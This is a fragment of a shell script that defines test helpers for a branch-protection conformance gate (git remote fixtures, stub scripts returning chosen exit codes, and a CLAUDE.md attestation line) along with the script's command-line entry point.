st_nongh()  { git -C "$1" remote add origin https://gitlab.com/fixture/repo.git 2>/dev/null || git -C "$1" remote set-url origin https://gitlab.com/fixture/repo.git; }
st_norem()  { git -C "$1" remote remove origin 2>/dev/null || true; }
# st_bpstub <dir> <exit>: replace branch-protection.sh in the fixture with a stub returning <exit> (for --raw and otherwise)
st_bpstub() {  # <fixture> <rc> [stdout-line]: the line travels via a side file, never interpolated into the stub's source
  [ -n "${3:-}" ] && printf '%s\n' "$3" > "$1/conformance/bp-stub.msg"
  printf '#!/bin/sh\n[ -f "$(dirname "$0")/bp-stub.msg" ] && cat "$(dirname "$0")/bp-stub.msg"\nexit %s\n' "$2" > "$1/conformance/branch-protection.sh"; chmod +x "$1/conformance/branch-protection.sh"; }
# st_bpstub_split <fixture> <raw-rc> <declared-only-rc> <declared-only-line> (RT5-Q4): a flag-aware
# stub — `--raw` returns <raw-rc> silently (mirrors the live leg being unverifiable), `--declared-
# only` returns <declared-only-rc> printing <declared-only-line> (mirrors the OFFLINE RD-4 check
# firing independently of GitHub's own reachability). The line travels via a side file, never
# interpolated into the stub's source.
st_bpstub_split() {
  printf '%s\n' "$4" > "$1/conformance/bp-stub-do.msg"
  printf '#!/bin/sh\ncase " $* " in\n  *" --declared-only "*) cat "$(dirname "$0")/bp-stub-do.msg"; exit %s ;;\n  *) exit %s ;;\nesac\n' "$3" "$2" > "$1/conformance/branch-protection.sh"
  chmod +x "$1/conformance/branch-protection.sh"
}
# st_attest <dir>: append a non-GitHub attestation using the STABLE (§branch-protection) marker
st_attest() { printf '%s\n' '- **Branch protection** (§branch-protection): attested: gitlab protected-branches' >> "$1/CLAUDE.md"; }

case "${1:-}" in
  --selftest) selftest; exit $? ;;
  *)
    MODE=strict; _dir=.
    for a in "$@"; do case "$a" in --surface) MODE=surface ;; --strict) MODE=strict ;; *) _dir="$a" ;; esac; done
    MODE="$MODE" run_gate "$_dir"; exit $? ;;
esac
